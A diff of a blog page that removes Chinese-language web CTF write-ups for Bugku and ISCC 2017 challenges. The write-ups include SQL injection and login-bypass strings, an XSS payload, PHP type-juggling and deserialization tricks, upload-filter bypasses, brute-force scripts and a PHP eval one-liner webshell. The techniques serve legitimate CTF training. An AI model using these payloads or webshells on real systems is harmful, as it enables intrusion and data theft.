-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--index.php--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bugku-ctf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    </div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">	error_reporting(<span class="number">0</span>);</div><div class="line">	<span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</div><div class="line">	$file=$_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</div><div class="line">		<span class="keyword">exit</span>();</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">include</span>($file); </div><div class="line"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
-<h2 id="phpcmsV9"><a href="#phpcmsV9" class="headerlink" title="phpcmsV9"></a>phpcmsV9</h2><p>利用的是phpcmsV9.6.0的任意文件上传漏洞，<a href="http://www.bugku.com/thread-41-1-1.html" target="_blank" rel="external">下载phpcmsV9.6.0 getshell 工具</a>上传小马，用菜刀连接，即可在Web根目录拿到flag.txt</p>
-<h2 id="海洋CMS"><a href="#海洋CMS" class="headerlink" title="海洋CMS"></a>海洋CMS</h2><p>海洋CMS 6.45代码执行漏洞。参考：<a href="http://0day5.com/archives/4249/" target="_blank" rel="external">seacms最新版前台getshell</a></p>
-<p><img src="/2017/09/30/bugkuctf-web-writeup/2.png" alt=""></p>
-<p>访问flag32#.txt即可拿到flag。</p>
-<h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>burpsuite五位数字爆破即可。密码为13579。</p>
-<h2 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h2><p>点击“链接”可看到源码，利用php弱类型和strcmp漏洞。传入<code>?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=</code>即可拿到flag。参考：<a href="http://www.cnblogs.com/wh4am1/p/6687199.html" target="_blank" rel="external">php检查相等时的漏洞</a>。</p>
-<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>simple sqli。很常规，爆库爆表爆字段。根据<code>id=2</code>和<code>id=2&#39; and 1=1#</code>猜测sql语句为</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> foo <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$_GET['</span><span class="keyword">id</span><span class="string">']'</span></div></pre></td></tr></table></figure>
-<p>测试<code>id=-2&#39; union select 1,2,3,database()#</code>成功显示库名为skctf_flag。</p>
-<p><code>id=-2&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=&#39;skctf_flag&#39; limit x,1#(x=0,1,2...)</code>得到表名为fl4g和sc。</p>
-<p><code>id=-2&#39; union select 1,2,3,COLUMN_NAME from INFORMATION_SCHEMA.Columns where table_name=&#39;fl4g&#39; and table_schema=&#39;skctf_flag&#39;#</code>得到字段名为skctf_flag。</p>
-<p><code>id=-2&#39; union select 1,2,3,skctf_flag from fl4g#</code>得到flag。</p>
-<h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p>注释让我们以margin为键名post提交我们所发现的东西。response header有flag，base64解码2次然后POST。保持session，将response中新的flag再经过base64解码2次再POST提交，得到flag。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#python3.6</span></div><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, parse</div><div class="line"><span class="keyword">import</span> http.cookiejar</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line">str = <span class="string">"TXpNeU9USXg="</span>  <span class="comment">#经过一次base64解码后的flag</span></div><div class="line">url = <span class="string">r"http://120.24.86.145:8002/web6/"</span></div><div class="line">str = int(base64.b64decode(base64.b64decode(str)).decode(<span class="string">'ascii'</span>))</div><div class="line"></div><div class="line">cookie = http.cookiejar.CookieJar()</div><div class="line">handler = request.HTTPCookieProcessor(cookie)</div><div class="line">opener = request.build_opener(handler)</div><div class="line"></div><div class="line">data = &#123;<span class="string">'margin'</span>:str&#125;</div><div class="line">pdata = parse.urlencode(data)</div><div class="line">binary_data = pdata.encode(<span class="string">'ascii'</span>)</div><div class="line">con = opener.open(url,binary_data)</div><div class="line">str = con.getheader(<span class="string">'flag'</span>)[<span class="number">44</span>:<span class="number">56</span>]</div><div class="line">str = int(base64.b64decode(base64.b64decode(str)).decode(<span class="string">'ascii'</span>))</div><div class="line">print(base64.b64decode(con.getheader(<span class="string">'flag'</span>)).decode(<span class="string">'utf-8'</span>))</div><div class="line">print(con.read().decode(<span class="string">'utf-8'</span>))</div><div class="line"></div><div class="line">data = &#123;<span class="string">'margin'</span>:str&#125;</div><div class="line">pdata = parse.urlencode(data)</div><div class="line">binary_data = pdata.encode(<span class="string">'ascii'</span>)</div><div class="line">con = opener.open(url,binary_data)</div><div class="line">print(con.read().decode(<span class="string">'utf-8'</span>))</div></pre></td></tr></table></figure>
-<h2 id="cookies欺骗？？"><a href="#cookies欺骗？？" class="headerlink" title="cookies欺骗？？"></a>cookies欺骗？？</h2><p>将url中的filename改成<code>aW5kZXgucGhw</code>(index.php的base64编码)。编程遍历line参数（line=0,1,2…）得到index.php源码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</div><div class="line">	r = requests.get(<span class="string">"http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw"</span>%i)</div><div class="line">	print(r.content.decode(<span class="string">'utf8'</span>))</div></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//index.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</div><div class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</div><div class="line">$file_list = <span class="keyword">array</span>(</div><div class="line">    <span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</div><div class="line">    <span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</div><div class="line">);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</div><div class="line">    $file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</div><div class="line">    $fa = file($file);</div><div class="line">    <span class="keyword">echo</span> $fa[$line];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>添加<code>cookie:margin=margin</code>，打开<code>/web11/index.php?line=0&amp;filename=a2V5cy5waHA</code>得到flag。</p>
-<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>尖括号被过滤。<br>payload: <code>/?id=\u003cimg%20src=%23%20onerror=alert(_key_)\u003e</code></p>
-<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>访问/test/1p.html抓包,拿到部分源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&quot;;if(!$_GET[&apos;id&apos;])</div><div class="line">&#123;</div><div class="line">	header(&apos;Location: hello.php?id=1&apos;);</div><div class="line">	exit();</div><div class="line">&#125;</div><div class="line">$id=$_GET[&apos;id&apos;];</div><div class="line">$a=$_GET[&apos;a&apos;];</div><div class="line">$b=$_GET[&apos;b&apos;];</div><div class="line">if(stripos($a,&apos;.&apos;))</div><div class="line">&#123;</div><div class="line">	echo &apos;no no no no no no no&apos;;</div><div class="line">	return ;</div><div class="line">&#125;</div><div class="line">$data = @file_get_contents($a,&apos;r&apos;);</div><div class="line">if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</div><div class="line">&#123;</div><div class="line">	require(&quot;f4l2a3g.txt&quot;);</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">	print &quot;never never never give up !!!&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>直接访问/test/f4l2a3g.txt可拿到flag。（BTW：感觉是出题人疏忽了，正解应该是用php://伪协议和00截断）</p>
-<h2 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h2><p>利用php伪协议可拿到index.php等等的源码</p>
-<p><img src="/2017/09/30/bugkuctf-web-writeup/3.png" alt=""></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//index.php</span></div><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">$txt = $_GET[<span class="string">"txt"</span>];  </div><div class="line">$file = $_GET[<span class="string">"file"</span>];  </div><div class="line">$password = $_GET[<span class="string">"password"</span>];  </div><div class="line">  </div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </div><div class="line">		<span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</div><div class="line">        <span class="keyword">exit</span>();  </div><div class="line">    &#125;<span class="keyword">else</span>&#123;  </div><div class="line">        <span class="comment">//解题关键</span></div><div class="line">        <span class="keyword">include</span>($file);   </div><div class="line">        $password = unserialize($password);  </div><div class="line">        <span class="keyword">echo</span> $password;  </div><div class="line">    &#125;  </div><div class="line">&#125;<span class="keyword">else</span>&#123;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="meta">?&gt;</span>  </div><div class="line">  </div><div class="line">&lt;!--  </div><div class="line">$user = $_GET[<span class="string">"txt"</span>];  </div><div class="line">$file = $_GET[<span class="string">"file"</span>];  </div><div class="line">$pass = $_GET[<span class="string">"password"</span>];  </div><div class="line">  </div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></div><div class="line">&#125;<span class="keyword">else</span>&#123;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </div><div class="line">&#125;  </div><div class="line"> --&gt;</div></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//hint.php</span></div><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">  </div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></div><div class="line">    <span class="keyword">public</span> $file;  </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </div><div class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line">		<span class="keyword">return</span> (<span class="string">"good"</span>);</div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>因此，我们需要序列化一个Flag对象，且其变量file为flag.php。</p>
-<p><img src="/2017/09/30/bugkuctf-web-writeup/4.png" alt=""></p>
-<h2 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h2><p>注册一个admin+n个空格的帐号来覆盖管理员帐号。再用新密码登录admin即可拿到flag。</p>
-<p><img src="/2017/09/30/bugkuctf-web-writeup/5.png" alt=""></p>
-<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>index.php便是提示中的assert一句话。找到flag.txt访问即可。</p>
-<p><img src="/2017/09/30/bugkuctf-web-writeup/6.png" alt=""></p>
-<h2 id="各种绕过哟"><a href="#各种绕过哟" class="headerlink" title="各种绕过哟"></a>各种绕过哟</h2><p>sha1在处理数组的时候会warning并返回NULL。</p>
-<p><img src="/2017/09/30/bugkuctf-web-writeup/7.png" alt=""></p>
-<h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p>变量覆盖漏洞。访问/web8/?ac=test&amp;fn=php://input并POST数据<code>test</code>即可get flag。</p>
-<h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><p>payload: <code>/?id=keykey1111key:/1/1keya.</code>目测最短23位。</p>
-<h2 id="考细心"><a href="#考细心" class="headerlink" title="考细心"></a>考细心</h2><p>访问robots.txt得到/resusl.php。在/resusl.php提交GET参数<code>x=admin</code>即可拿到flag</p>
-<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>经过大佬们的提示，上传一个jpg，尝试把Content-Type的multipart/form-data;第一个字母m改成大写M。然后把文件名改成php5即可绕过。</p>
-<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>提示hint,尝试了hint.php和hint.txt之后才知道要GET传参数hint得到源码。脑洞很大。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">//index.php</div><div class="line">&lt;?php </div><div class="line">error_reporting(0); </div><div class="line">include_once("flag.php"); </div><div class="line">$cookie = $_COOKIE['ISecer']; </div><div class="line">if(isset($_GET['hint']))&#123; </div><div class="line">    show_source(__FILE__); </div><div class="line">&#125; </div><div class="line">elseif (unserialize($cookie) === "$KEY") </div><div class="line">&#123;    </div><div class="line">    echo "$flag"; </div><div class="line">&#125; </div><div class="line">else &#123; </div><div class="line">?&gt; </div><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt; </div><div class="line">&lt;title&gt;Login&lt;/title&gt; </div><div class="line">&lt;link rel="stylesheet" href="admin.css" type="text/css"&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">&lt;br&gt; </div><div class="line">&lt;div class="container" align="center"&gt; </div><div class="line">  &lt;form method="POST" action="#"&gt; </div><div class="line">    &lt;p&gt;&lt;input name="user" type="text" placeholder="Username"&gt;&lt;/p&gt; </div><div class="line">    &lt;p&gt;&lt;input name="password" type="password" placeholder="Password"&gt;&lt;/p&gt; </div><div class="line">    &lt;p&gt;&lt;input value="Login" type="button"/&gt;&lt;/p&gt; </div><div class="line">  &lt;/form&gt; </div><div class="line">&lt;/div&gt; </div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt; </div><div class="line"></div><div class="line">&lt;?php </div><div class="line">&#125; </div><div class="line">$KEY='ISecer:www.isecer.com'; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>然而这题有一个坑点，变量$KEY是定义在代码的末尾的。因此在前面将反序列化之后的$cookie与$KEY相比较时，$KEY的值是为NULL的。所以我们要传入的$cookie应该是<code>serialize(&quot;&quot;);</code></p>
-<p>因此，添加<code>Cookie: ISecer=s:0:&quot;&quot;;</code>即可拿到flag。</p>
-<h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>本来以为一发php://filter入魂。没想到”NAIVE”了。F12提示upload.php。上传一个带php一句话的jpg，利用file参数本地包含，发现php标签被过滤成了下划线。尝试</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'a'</span>]);var_dump(<span class="number">1</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>成功显示<code>int(1)</code>,菜刀连接即可看到flag文件。</p>
-<h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h2><p>查看SUN的文章，可发现一个生日。构造字典爆破得用户名为<code>SUN</code>,密码为<code>sun19980321</code>。登录后有一篇私人日志,大佬提示之后才知道是数据库的帐号密码。。。</p>
-<p><code>wp   wzTrzYRdbrbyjAx</code></p>
-<p>BTW.由于题目环境被破坏，无法复现截图:(</p>
-<p>访问/phpmyadmin。登录之后可看到flag表，拿到flag。</p>
-
+        
+          <a class="article-more-a" href="/2017/09/30/bugkuctf-web-writeup/#more">more >></a>
+        
       
 
       
@@ -888,28 +586,9 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">show_source(<span class="string">"../base.php"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <p>访问upload/xxx.php可拿到base.php源码。<br>再上传一个php5连接数据库可拿到flag。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$conn = mysql_connect(<span class="string">"localhost"</span>, <span class="string">"iscc2017"</span>, <span class="string">"iscc2017"</span>);</div><div class="line">mysql_select_db(<span class="string">"flag"</span>,$conn);</div><div class="line">$result = mysql_query(<span class="string">"select * from flag"</span>);</div><div class="line">var_dump(mysql_fetch_row($result));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<h2 id="where-is-your-flag"><a href="#where-is-your-flag" class="headerlink" title="where is your flag"></a>where is your flag</h2><p>访问flag.php发现hint:thisisflag。可知在表flag中有字段名为thisisflag。尝试GET请求<code>id=1</code>，页面返回正常;请求<code>id=2-1</code>，返回空白页面，可猜测，sql语句为</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foobar <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$_GET['</span><span class="keyword">id</span><span class="string">']'</span></div></pre></td></tr></table></figure>
-<p>测试可知为宽字节注入,且需要转换编码为gbk:</p>
-<p><img src="/2017/05/25/ISCC-2017-Web-writeup/2.png" alt=""></p>
-<h2 id="我们一起来日站"><a href="#我们一起来日站" class="headerlink" title="我们一起来日站"></a>我们一起来日站</h2><p>尝试访问<code>robots.txt</code>,发现<code>Disallow: /21232f297a57a5a743894a0e4a801fc3/</code>，提示keep finding admin page，访问<code>/admin.php</code>进入后台登录界面。简单注入：username为<code>admin</code>，passwd为<code>&#39;or 1#</code>拿到flag。</p>
-<h2 id="自相矛盾"><a href="#自相矛盾" class="headerlink" title="自相矛盾"></a>自相矛盾</h2><p>F12拿到部分源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</div><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'iscc'</span>]); </div><div class="line"></div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">    is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">        ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">        $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"bar2"</span>]);</div><div class="line">        $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $v2=<span class="number">1</span>;</div><div class="line">    &#125;	</div><div class="line">&#125;</div><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">    <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">		</div><div class="line">        eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">        strpos(($c[<span class="number">0</span>].$d), <span class="string">"isccctf2017"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">		</div><div class="line">    &#125;</div><div class="line">	</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; </div><div class="line">   </div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>其中$v2中的array_search()绕过参考了某个大佬的博客：<a href="http://www.bertramc.cn/2017/03/25/20.html" target="_blank" rel="external">array_search()绕过</a>。$v3中正则的绕过采用%00截断。</p>
-<p><img src="/2017/05/25/ISCC-2017-Web-writeup/3.png" alt=""></p>
-<h2 id="Simple-sqli"><a href="#Simple-sqli" class="headerlink" title="Simple sqli"></a>Simple sqli</h2><p>验证码要求md5加密后前三位等于一个随机字符串，于是可以写个脚本爆破出符合要求的验证码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#python3.6</span></div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">sub = <span class="string">"随机字符串"</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</div><div class="line">    <span class="keyword">if</span> hashlib.md5(str(i).encode(<span class="string">'utf8'</span>)).hexdigest().startswith(sub):</div><div class="line">    	print(i)</div><div class="line">    	<span class="keyword">break</span></div></pre></td></tr></table></figure>
-<p>测试发现，当Username为<code>admin</code>和<code>&#39; or 1#</code>时显示password error. 输入不存在的Username或者sql语法错误时显示username error. 输入<code>&#39;union select 1</code>亦显示password error. 可以猜测sql语句为：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> foobar <span class="keyword">WHERE</span> username=<span class="string">''</span></div></pre></td></tr></table></figure>
-<p>然后将查询结果与用户输入的md5加密后的password进行比较。</p>
-<p>于是可以令<code>Username=&#39; union select md5(1)#</code>,<code>Password=1</code>,即可拿到Flag。</p>
